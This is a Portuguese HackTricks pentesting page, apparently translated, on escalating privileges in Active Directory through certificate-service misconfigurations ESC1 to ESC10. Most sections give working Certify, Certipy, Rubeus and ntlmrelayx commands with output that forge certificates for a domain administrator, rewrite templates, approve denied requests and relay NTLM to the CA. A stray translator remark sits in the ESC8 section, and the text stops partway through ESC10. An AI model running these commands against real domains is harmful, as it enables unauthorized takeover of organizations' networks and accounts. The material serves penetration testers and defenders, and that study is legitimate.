# Escalonamento de Domínio no AD CS

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Participe do grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou do grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

## Modelos de Certificado Mal Configurados - ESC1

### Explicação

* O **Enterprise CA** concede **direitos de inscrição a usuários com poucos privilégios**
* **A aprovação do gerente está desativada**
* **Não são necessárias assinaturas autorizadas**
* Um **modelo de certificado** com descritor de segurança excessivamente permissivo **concede direitos de inscrição de certificado a usuários com poucos privilégios**
* O **modelo de certificado define EKUs que permitem autenticação**:
* _Autenticação do Cliente (OID 1.3.6.1.5.5.7.3.2), Autenticação do Cliente PKINIT (1.3.6.1.5.2.3.4), Logon de Smart Card (OID 1.3.6.1.4.1.311.20.2.2), Qualquer Finalidade (OID 2.5.29.37.0), ou sem EKU (SubCA)._
* O **modelo de certificado permite que os solicitantes especifiquem um subjectAltName no CSR:**
* O **AD** irá **usar** a identidade especificada pelo campo **subjectAltName** (SAN) de um certificado **se** ele estiver **presente**. Consequentemente, se um solicitante pode especificar o SAN em um CSR, o solicitante pode **solicitar um certificado como qualquer pessoa** (por exemplo, um usuário administrador de domínio). O objeto AD do modelo de certificado **especifica** se o solicitante **pode especificar o SAN** em sua propriedade **`mspki-certificate-name-`**`flag`. A propriedade `mspki-certificate-name-flag` é uma **máscara de bits** e se a flag **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** estiver **presente**, um **solicitante pode especificar o SAN.**

{% hint style="danger" %}
Essas configurações permitem que um **usuário com poucos privilégios solicite um certificado com um SAN arbitrário**, permitindo que o usuário com poucos privilégios se autentique como qualquer principal no domínio via Kerberos ou SChannel.
{% endhint %}

Isso é frequentemente habilitado, por exemplo, para permitir que produtos ou serviços de implantação gerem certificados HTTPS ou certificados de host sob demanda. Ou por falta de conhecimento.

Observe que quando um certificado com essa última opção é criado, um **aviso aparece**, mas não aparece se um **modelo de certificado** com essa configuração for **duplicado** (como o modelo `WebServer` que tem `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` habilitado e depois o administrador pode adicionar um OID de autenticação).

### Abuso

Para **encontrar modelos de certificado vulneráveis** você pode executar:
```bash
Certify.exe find /vulnerable
certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128
```
Para **abusar dessa vulnerabilidade para se passar por um administrador**, poderia-se executar:
```bash
Certify.exe request /ca:dc.theshire.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Então você pode transformar o certificado gerado para o formato **`.pfx`** e usá-lo para **autenticar usando Rubeus ou certipy** novamente:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Os binários do Windows "Certreq.exe" e "Certutil.exe" podem ser explorados para gerar o PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Além disso, a seguinte consulta LDAP, quando executada contra o esquema de configuração da Floresta AD, pode ser usada para **enumerar** **modelos de certificados** que **não exigem aprovação/assinaturas**, que possuem um EKU de **Autenticação de Cliente ou Logon de Cartão Inteligente**, e têm a flag **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** ativada:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Modelos de Certificados Mal Configurados - ESC2

### Explicação

O segundo cenário de abuso é uma variação do primeiro:

1. A CA Empresarial concede direitos de inscrição a usuários com baixos privilégios.
2. A aprovação do gerente está desativada.
3. Não são necessárias assinaturas autorizadas.
4. Um descritor de segurança de modelo de certificado excessivamente permissivo concede direitos de inscrição de certificado a usuários com baixos privilégios.
5. **O modelo de certificado define o EKU de Qualquer Propósito ou nenhum EKU.**

O **EKU de Qualquer Propósito** permite que um atacante obtenha um **certificado** para **qualquer propósito**, como autenticação de cliente, autenticação de servidor, assinatura de código, etc. A mesma **técnica usada para o ESC3** pode ser usada para abusar disso.

Um **certificado sem EKUs** — um certificado de CA subordinada — pode ser abusado para **qualquer propósito** também, mas poderia **também usá-lo para assinar novos certificados**. Assim, usando um certificado de CA subordinada, um atacante poderia **especificar EKUs arbitrários ou campos nos novos certificados.**

No entanto, se a **CA subordinada não for confiável** pelo objeto **`NTAuthCertificates`** (o que não será por padrão), o atacante **não pode criar novos certificados** que funcionarão para **autenticação de domínio**. Ainda assim, o atacante pode criar **novos certificados com qualquer EKU** e valores de certificado arbitrários, dos quais há **muitos** que o atacante poderia potencialmente **abusar** (por exemplo, assinatura de código, autenticação de servidor, etc.) e que podem ter grandes implicações para outras aplicações na rede como SAML, AD FS ou IPSec.

A seguinte consulta LDAP, quando executada contra o esquema de configuração da Floresta AD, pode ser usada para enumerar modelos que correspondem a este cenário:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Modelos de Agente de Inscrição Mal Configurados - ESC3

### Explicação

Este cenário é semelhante ao primeiro e segundo, mas **abusando** de um **EKU diferente** (Agente de Solicitação de Certificado) e **2 modelos diferentes** (portanto, tem 2 conjuntos de requisitos),

O **EKU de Agente de Solicitação de Certificado** (OID 1.3.6.1.4.1.311.20.2.1), conhecido como **Agente de Inscrição** na documentação da Microsoft, permite que um principal **inscreva-se** para um **certificado** **em nome de outro usuário**.

O **"agente de inscrição"** se inscreve em tal **modelo** e usa o **certificado resultante para co-assinar um CSR em nome do outro usuário**. Em seguida, **envia** o **CSR co-assinado** para a AC, inscrevendo-se em um **modelo** que **permite "inscrever em nome de"**, e a AC responde com um **certificado pertencente ao "outro" usuário**.

**Requisitos 1:**

1. A AC Empresarial permite direitos de inscrição para usuários de baixo privilégio.
2. A aprovação do gerente está desativada.
3. Não são necessárias assinaturas autorizadas.
4. Um descritor de segurança de modelo de certificado excessivamente permissivo permite direitos de inscrição de certificado para usuários de baixo privilégio.
5. O **modelo de certificado define o EKU de Agente de Solicitação de Certificado**. O OID de Agente de Solicitação de Certificado (1.3.6.1.4.1.311.20.2.1) permite solicitar outros modelos de certificado em nome de outros principais.

**Requisitos 2:**

1. A AC Empresarial permite direitos de inscrição para usuários de baixo privilégio.
2. A aprovação do gerente está desativada.
3. **A versão do esquema do modelo é 1 ou é maior que 2 e especifica um Requisito de Emissão de Política de Aplicação exigindo o EKU de Agente de Solicitação de Certificado.**
4. O modelo de certificado define um EKU que permite autenticação de domínio.
5. Restrições de agente de inscrição não são implementadas na AC.

### Abuso

Você pode usar [**Certify**](https://github.com/GhostPack/Certify) ou [**Certipy**](https://github.com/ly4k/Certipy) para abusar deste cenário:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:Vuln-EnrollmentAgent
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req 'corp.local/john:Pass0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
As Autoridades de Certificação (CAs) empresariais podem **restringir** os **usuários** que podem **obter** um **certificado de agente de inscrição**, os modelos de inscrição nos quais os **agentes podem se inscrever** e quais **contas** o agente de inscrição pode **agir em nome de** ao abrir o `certsrc.msc` `snap-in -> clicar com o botão direito na CA -> clicar em Propriedades -> navegar` até a aba "Agentes de Inscrição".

No entanto, a configuração **padrão** da CA é "**Não restringir agentes de inscrição**". Mesmo quando os administradores ativam "Restringir agentes de inscrição", a configuração padrão é extremamente permissiva, permitindo que Todos acessem e se inscrevam em todos os modelos como qualquer um.

## Controle de Acesso Vulnerável a Modelos de Certificado - ESC4

### **Explicação**

Os **modelos de certificado** têm um **descritor de segurança** que especifica quais **princípios** do AD têm **permissões específicas sobre o modelo**.

Se um **atacante** tem permissões suficientes para **modificar** um **modelo** e **criar** qualquer uma das **más configurações** exploráveis das **seções anteriores**, ele poderá explorá-lo e **escalar privilégios**.

Direitos interessantes sobre modelos de certificado:

* **Owner:** Controle total implícito do objeto, pode editar quaisquer propriedades.
* **FullControl:** Controle total do objeto, pode editar quaisquer propriedades.
* **WriteOwner:** Pode modificar o proprietário para um princípio controlado pelo atacante.
* **WriteDacl**: Pode modificar o controle de acesso para conceder ao atacante FullControl.
* **WriteProperty:** Pode editar quaisquer propriedades

### Abuso

Um exemplo de um privesc como o anterior:

<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>

ESC4 é quando um usuário tem privilégios de escrita sobre um modelo de certificado. Isso pode, por exemplo, ser abusado para sobrescrever a configuração do modelo de certificado para tornar o modelo vulnerável ao ESC1.

Como podemos ver no caminho acima, apenas `JOHNPC` tem esses privilégios, mas nosso usuário `JOHN` tem a nova aresta `AddKeyCredentialLink` para `JOHNPC`. Como esta técnica está relacionada a certificados, eu também implementei este ataque, que é conhecido como [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Aqui está uma pequena prévia do comando `shadow auto` do Certipy para recuperar o hash NT da vítima.

<figure><img src="../../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

**Certipy** pode sobrescrever a configuração de um modelo de certificado com um único comando. Por **padrão**, Certipy vai **sobrescrever** a configuração para torná-la **vulnerável ao ESC1**. Também podemos especificar o parâmetro **`-save-old` para salvar a configuração antiga**, o que será útil para **restaurar** a configuração após nosso ataque.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Controle de Acesso a Objeto PKI Vulnerável - ESC5

### Explicação

A rede de relações baseadas em ACL interconectadas que podem afetar a segurança do AD CS é extensa. Vários **objetos fora dos modelos de certificado** e da própria autoridade de certificação podem ter um **impacto na segurança de todo o sistema AD CS**. Essas possibilidades incluem (mas não se limitam a):

* O **objeto de computador AD do servidor CA** (ou seja, comprometimento através de S4U2Self ou S4U2Proxy)
* O **servidor RPC/DCOM do servidor CA**
* Qualquer **objeto AD descendente ou contêiner no contêiner** `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` (por exemplo, o contêiner de Modelos de Certificado, o contêiner de Autoridades de Certificação, o objeto NTAuthCertificates, o contêiner de Serviços de Inscrição, etc.)

Se um atacante com baixos privilégios conseguir **ganhar controle sobre qualquer um destes**, o ataque provavelmente poderá **comprometer o sistema PKI**.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explicação

Há outro problema semelhante, descrito no [**post da CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage), que envolve a flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`**. Como a Microsoft descreve, “**Se** esta flag estiver **ativada** na CA, **qualquer solicitação** (incluindo quando o assunto é construído a partir do Active Directory®) pode ter **valores definidos pelo usuário** no **nome alternativo do assunto**.”\
Isso significa que um **atacante** pode se inscrever em **QUALQUER modelo** configurado para autenticação de domínio que também **permita que usuários não privilegiados** se inscrevam (por exemplo, o modelo de Usuário padrão) e **obter um certificado** que nos permite **autenticar** como um administrador de domínio (ou **qualquer outro usuário/máquina ativo**).

**Nota**: os **nomes alternativos** aqui são **incluídos** em um CSR através do argumento `-attrib "SAN:"` para `certreq.exe` (ou seja, “Pares de Valor de Nome”). Isso é **diferente** do método para **abusar de SANs** no ESC1, pois **armazena informações da conta em um atributo de certificado vs uma extensão de certificado**.

### Abuso

As organizações podem **verificar se a configuração está ativada** usando o seguinte comando `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Abaixo, isso apenas usa **remote** **registry**, então o seguinte comando também pode funcionar:
```
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) e [**Certipy**](https://github.com/ly4k/Certipy) também verificam isso e podem ser usados para abusar dessa má configuração:
```bash
# Check for vulns, including this one
Certify.exe find

# Abuse vuln
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Essas configurações podem ser **definidas**, assumindo direitos **administrativos do domínio** (ou equivalentes), de qualquer sistema:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Se você encontrar essa configuração no seu ambiente, você pode **remover essa flag** com:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
Após as atualizações de segurança de maio de 2022, novos **certificados** terão uma **extensão de segurança** que **incorpora** a propriedade **`objectSid` do solicitante**. Para o ESC1, essa propriedade será refletida a partir do SAN especificado, mas com o **ESC6**, essa propriedade reflete o **`objectSid` do solicitante**, e não do SAN.\
Assim, **para abusar do ESC6**, o ambiente deve ser **vulnerável ao ESC10** (Mapeamentos Fracos de Certificado), onde o **SAN é preferido sobre a nova extensão de segurança**.
{% endhint %}

## Controle de Acesso Vulnerável à Autoridade de Certificação - ESC7

### Ataque 1

#### Explicação

Uma autoridade de certificação em si tem um **conjunto de permissões** que protegem várias **ações da CA**. Essas permissões podem ser acessadas a partir de `certsrv.msc`, clicando com o botão direito em uma CA, selecionando propriedades e mudando para a aba Segurança:

<figure><img src="../../../.gitbook/assets/image (73) (2).png" alt=""><figcaption></figcaption></figure>

Isso também pode ser enumerado via [**módulo do PSPKI**](https://www.pkisolutions.com/tools/pspki/) com `Get-CertificationAuthority | Get-CertificationAuthorityAcl`:
```bash
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-certificationAuthorityAcl | select -expand Access
```
#### Abuso

Se você tem um principal com direitos **`ManageCA`** em uma **autoridade de certificação**, podemos usar **PSPKI** para alterar remotamente o bit **`EDITF_ATTRIBUTESUBJECTALTNAME2`** para **permitir especificação SAN** em qualquer modelo ([ECS6](domain-escalation.md#editf\_attributesubjectaltname2-esc6)):

<figure><img src="../../../.gitbook/assets/image (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (70) (2).png" alt=""><figcaption></figcaption></figure>

Isso também é possível de forma mais simples com o cmdlet [**Enable-PolicyModuleFlag do PSPKI**](https://www.sysadmins.lv/projects/pspki/enable-policymoduleflag.aspx).

Os direitos **`ManageCertificates`** permitem **aprovar uma solicitação pendente**, contornando assim a proteção de "aprovação do gerente de certificados da CA".

Você pode usar uma **combinação** dos módulos **Certify** e **PSPKI** para solicitar um certificado, aprová-lo e baixá-lo:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.theshire.local\theshire-DC-CA /id:336
```
### Ataque 2

#### Explicação

{% hint style="warning" %}
No **ataque anterior**, as permissões de **`Manage CA`** foram usadas para **ativar** a flag **EDITF\_ATTRIBUTESUBJECTALTNAME2** para realizar o ataque **ESC6**, mas isso não terá efeito até que o serviço de CA (`CertSvc`) seja reiniciado. Quando um usuário tem o direito de acesso `Manage CA`, ele também está autorizado a **reiniciar o serviço**. No entanto, **isso não significa que o usuário possa reiniciar o serviço remotamente**. Além disso, o **ESC6 pode não funcionar imediatamente** na maioria dos ambientes atualizados devido às atualizações de segurança de maio de 2022.
{% endhint %}

Portanto, outro ataque é apresentado aqui.

Pré-requisitos:

* Apenas permissão de **`ManageCA`**
* Permissão de **`Manage Certificates`** (pode ser concedida a partir de **`ManageCA`**)
* O modelo de certificado **`SubCA`** deve estar **ativado** (pode ser ativado a partir de **`ManageCA`**)

A técnica depende do fato de que usuários com os direitos de acesso `Manage CA` _e_ `Manage Certificates` podem **emitir solicitações de certificados falhadas**. O modelo de certificado **`SubCA`** é **vulnerável ao ESC1**, mas **apenas administradores** podem se inscrever no modelo. Assim, um **usuário** pode **solicitar** para se inscrever no **`SubCA`** - o que será **negado** - mas **depois emitido pelo gerente**.

#### Abuso

Você pode **conceder a si mesmo o direito de acesso `Manage Certificates`** adicionando seu usuário como um novo oficial.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
O modelo **`SubCA`** pode ser **ativado no CA** com o parâmetro `-enable-template`. Por padrão, o modelo `SubCA` está ativado.
```bash
# List templates
certipy ca 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Se cumprirmos os pré-requisitos para este ataque, podemos começar por **solicitar um certificado baseado no modelo `SubCA`**.

**Este pedido será negado**, mas vamos guardar a chave privada e anotar o ID do pedido.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Com nossas permissões de **`Manage CA` e `Manage Certificates`**, podemos então **emitir o certificado falhado** com o comando `ca` e o parâmetro `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
E finalmente, podemos **recuperar o certificado emitido** com o comando `req` e o parâmetro `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay para Endpoints HTTP do AD CS – ESC8

### Explicação

{% hint style="info" %}
Resumindo, se um ambiente possui **AD CS instalado**, juntamente com um **endpoint de inscrição web vulnerável** e pelo menos um **modelo de certificado publicado** que permite a **inscrição de computadores do domínio e autenticação de cliente** (como o modelo padrão **`Machine`**), então um **atacante pode comprometer QUALQUER computador com o serviço de spooler em execução**!
{% endhint %}

O AD CS suporta vários **métodos de inscrição baseados em HTTP** por meio de funções adicionais do servidor AD CS que os administradores podem instalar. Essas interfaces de inscrição de certificados baseadas em HTTP são todas **vulneráveis a ataques de NTLM relay**. Usando NTLM relay, um atacante em uma **máquina comprometida pode se passar por qualquer conta do AD que autentique via NTLM**. Enquanto se passa pela conta vítima, um atacante poderia acessar essas interfaces web e **solicitar um certificado de autenticação de cliente baseado nos modelos de certificado `User` ou `Machine`**.

* A **interface de inscrição web** (um aplicativo ASP mais antigo acessível em `http://<caserver>/certsrv/`), por padrão suporta apenas HTTP, o qual não pode proteger contra ataques de NTLM relay. Além disso, ela explicitamente permite apenas autenticação NTLM por meio de seu cabeçalho HTTP de Autorização, então protocolos mais seguros como Kerberos são inutilizáveis.
* O **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service e **Network Device Enrollment Service** (NDES) suportam autenticação negociada por padrão por meio de seu cabeçalho HTTP de Autorização. A autenticação negociada **suporta** Kerberos e **NTLM**; consequentemente, um atacante pode **negociar para baixo até a autenticação NTLM** durante ataques de relay. Esses serviços web pelo menos habilitam HTTPS por padrão, mas infelizmente HTTPS por si só **não protege contra ataques de NTLM relay**. Apenas quando HTTPS é combinado com vinculação de canal os serviços HTTPS podem ser protegidos de ataques de NTLM relay. Infelizmente, o AD CS não habilita Proteção Estendida para Autenticação no IIS, que é necessária para habilitar a vinculação de canal.

Problemas comuns **com ataques de NTLM relay** são que as **sessões NTLM são geralmente curtas** e que o atacante **não pode** interagir com serviços que **exigem assinatura NTLM**.

No entanto, abusar de um ataque de NTLM relay para obter um certificado para o usuário resolve essas limitações, pois a sessão viverá enquanto o certificado for válido e o certificado pode ser usado para usar serviços **que exigem assinatura NTLM**. Para saber como usar um certificado roubado, confira:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

Outra limitação dos ataques de NTLM relay é que eles **requerem que uma conta vítima se autentique em uma máquina controlada pelo atacante**. Um atacante poderia esperar ou tentar **forçar** isso:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Abuso**

\*\*\*\*[**Certify**](https://github.com/GhostPack/Certify)’s `cas` command can enumerate **enabled HTTP AD CS endpoints**:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

As CAs empresariais também **armazenam pontos finais CES** em seu objeto AD na propriedade `msPKI-Enrollment-Servers`. **Certutil.exe** e **PSPKI** podem analisar e listar esses pontos finais:
```
certutil.exe -enrollmentServerURL -config CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA
```
Como não há texto em inglês fornecido além da marcação de imagem, não há nada para traduzir. A marcação deve permanecer inalterada:

```markdown
<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
```
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
#### Abuso com Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuso com [Certipy](https://github.com/ly4k/Certipy)

Por padrão, o Certipy solicitará um certificado baseado no modelo `Machine` ou `User` dependendo se o nome da conta retransmitida termina com `$`. É possível especificar outro modelo com o parâmetro `-template`.

Podemos então usar uma técnica como [PetitPotam](https://github.com/ly4k/PetitPotam) para coagir a autenticação. Para controladores de domínio, devemos especificar `-template DomainController`.
```
$ certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Sem Extensão de Segurança - ESC9 <a href="#5485" id="5485"></a>

### Explicação

ESC9 refere-se ao novo valor **`msPKI-Enrollment-Flag`** **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`). Se essa flag estiver configurada em um modelo de certificado, a **nova extensão de segurança `szOID_NTDS_CA_SECURITY_EXT`** **não** será incorporada. ESC9 só é útil quando `StrongCertificateBindingEnforcement` está definido como `1` (padrão), já que uma configuração de mapeamento de certificado mais fraca para Kerberos ou Schannel pode ser abusada como ESC10 — sem ESC9 — pois os requisitos serão os mesmos.

* `StrongCertificateBindingEnforcement` não está definido como `2` (padrão: `1`) ou `CertificateMappingMethods` contém a flag `UPN`
* Certificado contém a flag `CT_FLAG_NO_SECURITY_EXTENSION` no valor `msPKI-Enrollment-Flag`
* Certificado especifica qualquer EKU de autenticação de cliente
* `GenericWrite` sobre qualquer conta A para comprometer qualquer conta B

### Abuso

Neste caso, `John@corp.local` tem `GenericWrite` sobre `Jane@corp.local`, e desejamos comprometer `Administrator@corp.local`. `Jane@corp.local` tem permissão para se inscrever no modelo de certificado `ESC9` que especifica a flag `CT_FLAG_NO_SECURITY_EXTENSION` no valor `msPKI-Enrollment-Flag`.

Primeiro, obtemos o hash de `Jane` com, por exemplo, Shadow Credentials (usando nosso `GenericWrite`).

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (22).png" alt=""><figcaption></figcaption></figure>

Em seguida, mudamos o `userPrincipalName` de `Jane` para ser `Administrator`. Observe que estamos deixando de fora a parte `@corp.local`.

<figure><img src="../../../.gitbook/assets/image (2) (2) (3).png" alt=""><figcaption></figcaption></figure>

Isso não é uma violação de restrição, já que o `userPrincipalName` do usuário `Administrator` é `Administrator@corp.local` e não `Administrator`.

Agora, solicitamos o modelo de certificado vulnerável `ESC9`. Devemos solicitar o certificado como `Jane`.

<figure><img src="../../../.gitbook/assets/image (16) (2).png" alt=""><figcaption></figcaption></figure>

Observe que o `userPrincipalName` no certificado é `Administrator` e que o certificado emitido não contém "object SID".

Então, mudamos de volta o `userPrincipalName` de `Jane` para ser algo diferente, como seu `userPrincipalName` original `Jane@corp.local`.

<figure><img src="../../../.gitbook/assets/image (24) (2).png" alt=""><figcaption></figcaption></figure>

Agora, se tentarmos nos autenticar com o certificado, receberemos o hash NT do usuário `Administrator@corp.local`. Você precisará adicionar `-domain <domain>` à sua linha de comando, já que não há domínio especificado no certificado.

<figure><img src="../../../.gitbook/assets/image (3) (1) (3).png" alt=""><figcaption></figcaption></figure>

## Mapeamentos Fracos de Certificados - ESC10

### Explicação

ESC10 refere-se a dois valores de chave de registro no controlador de domínio.

`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` `CertificateMappingMethods`. Valor padrão `0x18` (`0x8 | 0x10`), anteriormente `0x1F`.

`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` `StrongCertificateBindingEnforcement`. Valor padrão `1`, anteriormente `0`.

**Caso 1**

`StrongCertificateBindingEnforcement` definido como `0`

**Caso 2**

`CertificateMappingMethods` contém o bit `UPN` (`0x4`)

### Caso de Abuso 1

* `StrongCertificateBindingEnforcement` definido como `0`
* `GenericWrite` sobre qualquer conta A para comprometer qualquer conta B

Neste caso, `John@corp.local` tem `GenericWrite` sobre `Jane@corp.local`, e desejamos comprometer `Administrator@corp.local`. Os passos de abuso são quase idênticos ao ESC9, exceto que qualquer modelo de certificado pode ser usado.

Primeiro, obtemos o hash de `Jane` com, por exemplo, Shadow Credentials (usando nosso `GenericWrite`).

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (19).png" alt=""><figcaption></figcaption></figure>

Em seguida, mudamos o `userPrincipalName` de `Jane` para ser `Administrator`. Observe que estamos deixando de fora a parte `@corp.local`.

